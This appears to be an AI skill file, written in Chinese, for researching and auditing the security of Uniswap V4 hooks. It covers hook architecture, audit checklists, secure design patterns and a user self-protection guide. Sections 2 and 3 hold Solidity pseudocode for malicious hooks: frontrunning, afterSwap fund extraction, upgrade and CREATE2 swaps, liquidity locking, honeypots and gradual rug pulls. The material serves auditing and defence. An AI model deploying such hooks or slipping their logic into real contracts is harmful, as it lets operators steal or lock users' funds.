---
name: uniswap-v4-hooks-security
description: |
  Uniswap V4 Hook安全研究与审计框架。覆盖Hook生命周期回调、权限模型、
  攻击面分析、恶意Hook案例、审计检查清单、安全设计模式。
  基于Uniswap V4白皮书、EIP草案、OpenZeppelin/Trail of Bits审计报告、
  实际Hook合约源码深度调研。
  核心理念：Hook赋予池子可编程性的同时引入了巨大的信任假设和攻击面。
  触发词：「V4 Hook安全」「Hook审计」「恶意Hook」「Hook攻击」「V4安全检查」。
---

# Uniswap V4 Hook安全研究与审计框架

> Hook是V4最强大也最危险的特性。每个Hook都是一个信任假设——用户用自己的资金为Hook代码的正确性投票。
> 一个恶意或有缺陷的Hook可以在swap的任何阶段窃取资金、操纵价格、或锁定流动性。

## Skill规则

**此Skill激活后，以Uniswap V4 Hook安全研究员身份回应。**

- 所有攻击向量附带Solidity伪代码
- 审计检查清单可直接用于实际审计
- 区分"理论攻击"与"实际可行攻击"
- 每种攻击标注风险等级（Critical/High/Medium/Low）
- 给出防御方案和最佳实践

---

## 回答工作流

| 指令 | 行动 |
|------|------|
| 「V4 Hook怎么工作」 | -> 输出完整Hook生命周期架构 + 权限模型 |
| 「Hook有什么安全风险」 | -> 输出攻击面全景图 + 风险等级分类 |
| 「审计这个Hook合约」 | -> 按审计清单逐项检查 + 输出报告 |
| 「恶意Hook案例」 | -> 输出具体恶意Hook代码 + 攻击流程 |
| 「怎么设计安全Hook」 | -> 输出安全设计模式 + 参考实现 |
| 「V4和V3安全差异」 | -> 输出V4新增攻击面分析 |

---

## 一、V4 Hook架构深度解析

### 1.1 PoolManager Singleton模式

**V3 vs V4架构对比：**
```
V3: 每个Pool一个独立合约
  Factory -> Pool(ETH/USDC/0.3%) -> 独立状态

V4: 所有Pool共享一个PoolManager
  PoolManager -> Pool(key1) -> 内部mapping
              -> Pool(key2) -> 内部mapping
              -> ...
  
  优势：跨Pool操作无需跨合约调用，节省gas
  安全影响：PoolManager成为单点故障，Hook通过回调获得PoolManager上下文
```

**PoolKey结构：**
```solidity
struct PoolKey {
    Currency currency0;      // token0
    Currency currency1;      // token1
    uint24 fee;             // 手续费率（可以是动态费率）
    int24 tickSpacing;      // tick间距
    IHooks hooks;           // Hook合约地址
}
```

### 1.2 Hook生命周期回调

**完整回调列表（按执行顺序）：**

```
Pool初始化:
  beforeInitialize(sender, key, sqrtPriceX96, hookData) -> bytes4
  [Pool.initialize()]
  afterInitialize(sender, key, sqrtPriceX96, tick, hookData) -> bytes4

流动性操作:
  beforeAddLiquidity(sender, key, params, hookData) -> bytes4
  [Pool.modifyLiquidity() - 添加]
  afterAddLiquidity(sender, key, params, delta, hookData) -> bytes4

  beforeRemoveLiquidity(sender, key, params, hookData) -> bytes4
  [Pool.modifyLiquidity() - 移除]
  afterRemoveLiquidity(sender, key, params, delta, hookData) -> bytes4

Swap操作:
  beforeSwap(sender, key, params, hookData) -> (bytes4, BeforeSwapDelta, uint24)
  [Pool.swap()]
  afterSwap(sender, key, params, delta, hookData) -> (bytes4, int128)

Donate操作:
  beforeDonate(sender, key, amount0, amount1, hookData) -> bytes4
  [Pool.donate()]
  afterDonate(sender, key, amount0, amount1, hookData) -> bytes4
```

### 1.3 Hook权限模型：Address Bit Flags

**V4通过Hook合约地址的前导位来声明权限：**

```solidity
// Hook地址的高位bit决定激活哪些回调
uint160 constant BEFORE_INITIALIZE_FLAG  = 1 << 159;
uint160 constant AFTER_INITIALIZE_FLAG   = 1 << 158;
uint160 constant BEFORE_ADD_LIQUIDITY_FLAG = 1 << 157;
uint160 constant AFTER_ADD_LIQUIDITY_FLAG  = 1 << 156;
uint160 constant BEFORE_REMOVE_LIQUIDITY_FLAG = 1 << 155;
uint160 constant AFTER_REMOVE_LIQUIDITY_FLAG  = 1 << 154;
uint160 constant BEFORE_SWAP_FLAG        = 1 << 153;
uint160 constant AFTER_SWAP_FLAG         = 1 << 152;
uint160 constant BEFORE_DONATE_FLAG      = 1 << 151;
uint160 constant AFTER_DONATE_FLAG       = 1 << 150;
uint160 constant ACCESS_LOCK_FLAG        = 1 << 149;  // 废弃/重命名
```

**安全含义：**
- Hook地址是通过CREATE2 salt挖矿得到的，确保地址前缀匹配所需权限
- 一旦部署，权限不可变更（地址不可变）
- 但这不意味着Hook的行为不可变——Hook内部逻辑可以通过delegatecall或proxy模式改变

---

## 二、攻击面全景分析

### 2.1 攻击面分类

```
┌─────────────────────────────────────────────┐
│              V4 Hook 攻击面                   │
├─────────────────────────────────────────────┤
│ 1. beforeSwap价格操纵     [Critical]         │
│ 2. afterSwap利润提取       [Critical]         │
│ 3. Hook升级/自毁           [Critical]         │
│ 4. 重入攻击               [High]              │
│ 5. 流动性锁定             [High]              │
│ 6. 动态费率操纵           [High]              │
│ 7. 信息泄露/前运行        [Medium]            │
│ 8. 拒绝服务               [Medium]            │
│ 9. hookData注入           [Medium]            │
│ 10. 治理/权限滥用         [Medium]            │
└─────────────────────────────────────────────┘
```

### 2.2 攻击向量1：beforeSwap价格操纵 [Critical]

**攻击原理：** beforeSwap在swap执行前被调用，恶意Hook可以在此抢先交易。

```solidity
// 恶意Hook：在beforeSwap中抢先交易
contract MaliciousBeforeSwapHook is BaseHook {
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        // 检测到大额swap
        if (_isLargeSwap(params)) {
            // 在用户swap前，Hook先进行同方向swap
            // 利用PoolManager的flash accounting
            IPoolManager.SwapParams memory frontrunParams = IPoolManager.SwapParams({
                zeroForOne: params.zeroForOne,
                amountSpecified: _calculateFrontrunAmount(params),
                sqrtPriceLimitX96: params.sqrtPriceLimitX96
            });
            
            // Hook直接调用PoolManager.swap
            // 因为在同一个callback上下文中，有权限操作
            poolManager.swap(key, frontrunParams, "");
        }
        
        return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }
    
    // 在afterSwap中反向操作获利
    function afterSwap(...) external override returns (bytes4, int128) {
        // 反向swap，获取利润
        // ...
    }
}
```

**风险等级：Critical**
- 每笔swap都可能被Hook前运行
- 用户无法通过slippage保护——因为Hook操作发生在"内部"
- V4的singleton架构使得Hook可以直接操作PoolManager

### 2.3 攻击向量2：afterSwap利润提取 [Critical]

```solidity
// 恶意Hook：从afterSwap中偷取用户应得的output
contract ProfitExtractionHook is BaseHook {
    address private owner;
    uint256 private extractionBps = 100; // 1%，初始看起来很小
    
    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        BalanceDelta delta,
        bytes calldata hookData
    ) external override returns (bytes4, int128) {
        // 计算从delta中提取多少
        int128 outputAmount;
        if (params.zeroForOne) {
            outputAmount = delta.amount1();
        } else {
            outputAmount = delta.amount0();
        }
        
        // afterSwapDelta可以修改用户收到的amount
        // 返回负值 = Hook从输出中扣除
        int128 extraction = outputAmount * int128(int256(extractionBps)) / 10000;
        
        return (BaseHook.afterSwap.selector, -extraction);
    }
    
    // 渐进式rugpull：逐步提高extraction比例
    function increaseExtraction() external {
        require(msg.sender == owner);
        extractionBps += 10; // 每次增加0.1%
    }
}
```

### 2.4 攻击向量3：Hook升级/自毁 [Critical]

```solidity
// 看似安全的Hook，实际是proxy
contract UpgradeableHook is BaseHook {
    address private implementation;
    address private admin;
    
    // 初始审计时implementation指向安全逻辑
    // 之后admin可以切换到恶意逻辑
    
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    
    function upgrade(address newImpl) external {
        require(msg.sender == admin);
        implementation = newImpl;
    }
}

// selfdestruct攻击（EIP-6780后受限但仍需注意）
contract SelfDestructHook is BaseHook {
    function destroy() external {
        // EIP-6780后，selfdestruct只在创建交易中生效
        // 但仍可能通过CREATE2重部署不同bytecode
        selfdestruct(payable(msg.sender));
    }
}
```

**CREATE2重部署攻击：**
```
1. 部署Factory合约
2. 通过Factory用CREATE2部署安全Hook（得到确定地址，满足bit flag要求）
3. selfdestruct Hook（在EIP-6780前的链上或同一交易中）
4. 用相同salt通过CREATE2重新部署恶意Hook（地址不变，权限不变）
```

### 2.5 攻击向量4：重入攻击 [High]

```solidity
// V4的flash accounting机制可能开启重入路径
contract ReentrancyHook is BaseHook {
    bool private attacking;
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        if (!attacking) {
            attacking = true;
            
            // 在beforeSwap中触发另一个Pool的操作
            // V4的PoolManager允许在callback中嵌套调用
            PoolKey memory otherPool = _getRelatedPool(key);
            poolManager.swap(otherPool, params, "");
            
            // 或者触发外部合约调用，形成跨协议重入
            IExternalProtocol(externalAddr).deposit{value: 0}();
            
            attacking = false;
        }
        return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }
}
```

### 2.6 攻击向量5：流动性锁定 [High]

```solidity
// Hook阻止LP撤出流动性
contract LiquidityTrapHook is BaseHook {
    mapping(address => bool) private blacklist;
    uint256 private lockUntil;
    
    function beforeRemoveLiquidity(
        address sender,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4) {
        // 方式1：直接revert
        require(block.timestamp > lockUntil, "Liquidity locked");
        
        // 方式2：选择性阻止
        require(!blacklist[sender], "Not allowed");
        
        // 方式3：高gas消耗导致事实上无法撤出
        _consumeGas();
        
        return BaseHook.beforeRemoveLiquidity.selector;
    }
    
    // 管理员可以无限延长锁定期
    function extendLock(uint256 newLockUntil) external onlyOwner {
        lockUntil = newLockUntil;
    }
}
```

### 2.7 攻击向量6：动态费率操纵 [High]

```solidity
// V4允许Hook通过beforeSwap返回动态费率
contract DynamicFeeManipulationHook is BaseHook {
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        uint24 dynamicFee;
        
        // 对特定地址收取极高费率
        if (_isTargetedAddress(sender)) {
            dynamicFee = 999999; // 99.9999% 费率
        } else if (_isOwnerAddress(sender)) {
            dynamicFee = 0;     // 0费率
        } else {
            dynamicFee = 3000;  // 正常0.3%
        }
        
        // 通过hookReturnDelta标志使用动态费率
        return (BaseHook.beforeSwap.selector, 
                BeforeSwapDeltaLibrary.ZERO_DELTA, 
                dynamicFee | uint24(1 << 23)); // DYNAMIC_FEE_FLAG
    }
}
```

---

## 三、恶意Hook详细案例

### 3.1 Honeypot Hook（蜜罐）

**攻击流程：**
```
1. 部署看似正常的Hook + 创建Pool
2. 提供初始流动性，制造看起来有利可图的交易机会
3. 用户swap进入 → 正常执行
4. 用户想要反向swap退出 → beforeSwap阻止或收取天价费率
5. 或者：允许swap但afterSwap提取大部分输出
```

```solidity
contract HoneypotHook is BaseHook {
    bool private trapActive;
    uint256 private totalTrapped;
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        if (trapActive) {
            // 只允许单方向交易（买入）
            require(params.zeroForOne == true, "Sell not allowed");
            // 或者对卖出收取极高费率
        }
        return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }
    
    // 当足够多资金进入后激活陷阱
    function activateTrap() external onlyOwner {
        trapActive = true;
    }
}
```

### 3.2 渐进式Rugpull Hook

```solidity
contract GradualRugpullHook is BaseHook {
    uint256 private extractionRate = 0;  // 初始0%
    uint256 private totalExtracted;
    uint256 private constant MAX_RATE = 5000; // 最高50%
    
    // 每次swap后静默提取一小部分
    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        BalanceDelta delta,
        bytes calldata hookData
    ) external override returns (bytes4, int128) {
        if (extractionRate == 0) return (BaseHook.afterSwap.selector, 0);
        
        int128 amount = params.zeroForOne ? delta.amount1() : delta.amount0();
        int128 extracted = amount * int128(int256(extractionRate)) / 10000;
        
        totalExtracted += uint128(extracted > 0 ? extracted : -extracted);
        
        return (BaseHook.afterSwap.selector, -extracted);
    }
    
    // 每天小幅增加提取率，不容易被注意到
    function dailyIncrease() external onlyOwner {
        require(extractionRate < MAX_RATE);
        extractionRate += 10; // 每天增加0.1%
    }
}
```

### 3.3 前运行信息泄露Hook

```solidity
contract InformationLeakHook is BaseHook {
    // 记录所有pending swap的信息
    event PendingSwap(
        address sender, 
        bool zeroForOne, 
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96
    );
    
    address private mevBot;
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        // 向MEV bot发送信号
        // 虽然在同一交易中，但可以通过event/storage让协作者获取信息
        emit PendingSwap(sender, params.zeroForOne, params.amountSpecified, 
                        params.sqrtPriceLimitX96);
        
        // 或者通过storage slot让同一区块内的后续交易读取
        // （需要builder配合）
        return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }
}
```

---

## 四、Hook审计框架

### 4.1 完整审计检查清单

#### 第一层：不可变性检查 [Critical]

```
□ 1.1 Hook合约是否可升级？
    - 检查是否使用proxy pattern（delegatecall, EIP-1967 slot）
    - 检查是否有implementation变量
    - 检查是否有upgradeTo()或类似函数
    风险：可升级Hook可以在审计后变为恶意

□ 1.2 Hook合约是否包含selfdestruct？
    - 搜索selfdestruct/suicide操作码
    - 检查是否有CREATE2重部署路径
    风险：销毁后用不同代码重建

□ 1.3 Hook合约是否有外部代码依赖？
    - 检查delegatecall到外部地址
    - 检查是否读取外部合约的code/storage
    风险：外部依赖可以被攻击者控制
```

#### 第二层：回调行为检查 [Critical]

```
□ 2.1 beforeSwap是否修改Pool状态？
    - 检查是否调用poolManager.swap()
    - 检查是否调用poolManager.modifyLiquidity()
    - 检查是否调用poolManager.donate()
    风险：beforeSwap中的操作等于内部前运行

□ 2.2 afterSwap是否提取用户资金？
    - 检查afterSwap返回的int128值
    - 负值意味着从用户输出中扣除
    - 检查扣除是否有合理上限
    风险：静默资金提取

□ 2.3 beforeRemoveLiquidity是否可能revert？
    - 检查是否有条件性revert
    - 检查是否有黑名单机制
    - 检查是否有时间锁
    风险：流动性被永久锁定

□ 2.4 回调是否有gas炸弹？
    - 检查循环是否有边界
    - 检查是否有大量storage读写
    风险：交易因gas不足失败，事实上的DoS
```

#### 第三层：权限与治理检查 [High]

```
□ 3.1 Hook是否有管理员权限？
    - 检查onlyOwner/onlyAdmin修饰符
    - 列举所有管理员可调用的函数
    - 评估管理员权限的影响范围
    风险：管理员可以修改Hook行为

□ 3.2 管理员权限是否有timelock？
    - 检查敏感操作是否有延迟执行
    - timelock时长是否足够（建议>=48h）
    风险：管理员即时恶意修改

□ 3.3 费率参数是否有硬上限？
    - 检查动态费率的最大值
    - 检查提取比例的上限
    风险：参数被设为极端值

□ 3.4 是否有紧急暂停机制？
    - 检查pause/unpause功能
    - 暂停是否影响withdraw
    风险：暂停机制变成锁定机制
```

#### 第四层：外部交互检查 [High]

```
□ 4.1 Hook是否调用外部合约？
    - 列举所有external call
    - 评估被调用合约的信任等级
    风险：外部依赖被攻击

□ 4.2 是否有重入风险？
    - 检查callback中是否有外部调用
    - 检查是否使用reentrancy guard
    - 检查跨Pool操作的重入路径
    风险：重入导致状态不一致

□ 4.3 是否有Oracle依赖？
    - 检查价格Feed来源
    - 检查Oracle操纵可能性
    风险：Oracle攻击导致Hook行为异常

□ 4.4 是否向外部发送ETH/token？
    - 检查transfer/send/call with value
    - 资金流向是否透明
    风险：资金被转移到攻击者地址
```

#### 第五层：数据与隐私检查 [Medium]

```
□ 5.1 hookData参数如何处理？
    - 检查hookData的解码逻辑
    - 是否有长度/格式验证
    风险：恶意hookData导致异常行为

□ 5.2 是否泄露交易信息？
    - 检查event emission
    - 检查storage写入模式
    风险：MEV bot利用泄露信息

□ 5.3 是否有选择性执行逻辑？
    - 检查基于sender/amount的条件分支
    - 是否有白名单/黑名单
    风险：差别对待不同用户
```

### 4.2 关键安全属性（必须满足）

```
属性1: Non-Upgradeable（不可升级）
  验证: 无proxy pattern，无delegatecall到可变地址
  例外: 如果可升级，必须有timelock + multisig + 明确文档

属性2: No Selfdestruct（不可自毁）
  验证: 合约bytecode中无FF操作码
  注意: 检查所有被delegatecall的合约

属性3: No External Mutable Dependencies（无可变外部依赖）
  验证: 所有外部调用的目标地址为immutable
  例外: 知名不可变合约（如WETH9）

属性4: Bounded Extraction（有界提取）
  验证: afterSwap返回值有硬编码上限
  验证: 动态费率有硬编码上限

属性5: No Liquidity Lockup（不锁定流动性）
  验证: beforeRemoveLiquidity永远不revert
  例外: 有时间上限的lockup，且上限合理

属性6: Deterministic Behavior（确定性行为）
  验证: 相同输入 → 相同行为（无hidden state manipulation）
  验证: 无基于block.timestamp/number的隐蔽条件
```

---

## 五、安全设计模式

### 5.1 最小权限原则

```solidity
// 良好示例：只使用需要的回调
// 如果只需要动态费率，只激活beforeSwap
// 地址挖矿时只设置BEFORE_SWAP_FLAG bit

contract MinimalDynamicFeeHook is BaseHook {
    // 不实现afterSwap, beforeModifyPosition等不需要的回调
    // 减少攻击面
    
    function getHookPermissions() public pure override returns (Hooks.Permissions memory) {
        return Hooks.Permissions({
            beforeInitialize: false,
            afterInitialize: false,
            beforeAddLiquidity: false,
            afterAddLiquidity: false,
            beforeRemoveLiquidity: false,  // 关键：不阻止撤出
            afterRemoveLiquidity: false,
            beforeSwap: true,              // 只需要这一个
            afterSwap: false,
            beforeDonate: false,
            afterDonate: false
        });
    }
    
    function beforeSwap(
        address,
        PoolKey calldata,
        IPoolManager.SwapParams calldata,
        bytes calldata
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        uint24 fee = _calculateFee(); // 纯计算，不修改状态
        return (BaseHook.beforeSwap.selector, 
                BeforeSwapDeltaLibrary.ZERO_DELTA, 
                fee | uint24(1 << 23));
    }
}
```

### 5.2 Timelock模式

```solidity
contract TimelockHook is BaseHook {
    uint256 public constant TIMELOCK_DELAY = 48 hours;
    
    struct PendingChange {
        bytes32 paramHash;
        uint256 executeAfter;
        bool executed;
    }
    
    mapping(uint256 => PendingChange) public pendingChanges;
    uint256 public changeNonce;
    
    // 步骤1：提议更改（公开透明）
    function proposeChange(bytes calldata data) external onlyOwner returns (uint256) {
        uint256 nonce = changeNonce++;
        pendingChanges[nonce] = PendingChange({
            paramHash: keccak256(data),
            executeAfter: block.timestamp + TIMELOCK_DELAY,
            executed: false
        });
        emit ChangeProposed(nonce, data, block.timestamp + TIMELOCK_DELAY);
        return nonce;
    }
    
    // 步骤2：延迟后执行（用户有48h窗口退出）
    function executeChange(uint256 nonce, bytes calldata data) external onlyOwner {
        PendingChange storage change = pendingChanges[nonce];
        require(block.timestamp >= change.executeAfter, "Too early");
        require(!change.executed, "Already executed");
        require(keccak256(data) == change.paramHash, "Data mismatch");
        
        change.executed = true;
        _applyChange(data);
        emit ChangeExecuted(nonce);
    }
}
```

### 5.3 透明度模式

```solidity
contract TransparentHook is BaseHook {
    // 所有参数公开可读
    uint256 public feeRate;
    uint256 public extractionCap;
    address public feeRecipient;
    
    // 所有操作记录event
    event FeeCollected(address indexed user, uint256 amount);
    event ParameterChanged(string param, uint256 oldValue, uint256 newValue);
    
    // 硬编码上限，不可更改
    uint256 public constant MAX_FEE_RATE = 10000;    // 1%
    uint256 public constant MAX_EXTRACTION = 500;      // 0.05%
    
    function setFeeRate(uint256 newRate) external onlyOwner {
        require(newRate <= MAX_FEE_RATE, "Exceeds max");
        emit ParameterChanged("feeRate", feeRate, newRate);
        feeRate = newRate;
    }
}
```

### 5.4 不可变Hook模式（最安全）

```solidity
// 终极安全：所有参数在constructor中设置，无admin函数
contract ImmutableHook is BaseHook {
    uint24 public immutable dynamicFeeBps;
    uint256 public immutable maxPositionSize;
    
    constructor(
        IPoolManager _poolManager, 
        uint24 _feeBps,
        uint256 _maxSize
    ) BaseHook(_poolManager) {
        require(_feeBps <= 10000, "Fee too high");
        dynamicFeeBps = _feeBps;
        maxPositionSize = _maxSize;
    }
    
    // 无owner, 无admin, 无setter
    // 行为完全由constructor参数决定
    // 部署后不可变更
}
```

---

## 六、用户自保指南

### 6.1 使用V4 Pool前的检查

```
必查项：
1. Hook合约是否开源并验证？
   → Etherscan verified source code

2. Hook是否经过审计？
   → 查找知名审计机构报告

3. Hook的权限flags是什么？
   → 解析Hook地址的高位bits
   → 越多flags = 越大攻击面

4. Hook是否可升级？
   → 检查proxy pattern
   → 如果可升级，是否有timelock？

5. Hook的afterSwap是否返回非零值？
   → 非零意味着Hook在提取资金
   → 检查提取比例是否合理

6. Hook的beforeRemoveLiquidity是否可能revert？
   → 如果是，你的流动性可能被锁定
```

### 6.2 风险评级矩阵

| Hook特征 | 风险等级 | 建议 |
|----------|---------|------|
| 不可升级 + 无admin + 经审计 | Low | 可信任 |
| 有admin + timelock >= 48h + 经审计 | Medium | 谨慎使用，监控变更 |
| 有admin + 无timelock | High | 不建议使用 |
| 可升级 + 无timelock | Critical | 绝对不要使用 |
| 未开源 | Critical | 绝对不要使用 |
| 有beforeSwap + afterSwap + 可升级 | Critical | 绝对不要使用 |

---

## 七、V4安全发展趋势

### 7.1 Hook注册与评级系统

```
未来可能的解决方案：
1. Hook Registry: 链上注册表，记录审计状态
2. Hook Reputation Score: 基于TVL * 时间 * 审计次数
3. Hook Insurance: 审计通过的Hook提供保险
4. Hook Firewall: 前端层面拦截未审计Hook
```

### 7.2 形式化验证方向

```
可验证的Hook属性：
- beforeRemoveLiquidity不会revert（活性属性）
- afterSwap返回值 <= MAX_EXTRACTION（安全属性）
- 无状态依赖的外部调用（隔离属性）
- 所有路径都返回正确的selector（正确性属性）

工具：Certora, Halmos, KEVM
```

---

## 相关技能

- [hayden-adams-perspective](../hayden-adams-perspective/) - Hayden Adams对V4设计理念
- [defi-audit-methodology](../defi-audit-methodology/) - DeFi审计方法论（通用框架）
- [reentrancy-composability-risk](../reentrancy-composability-risk/) - 重入与可组合性风险
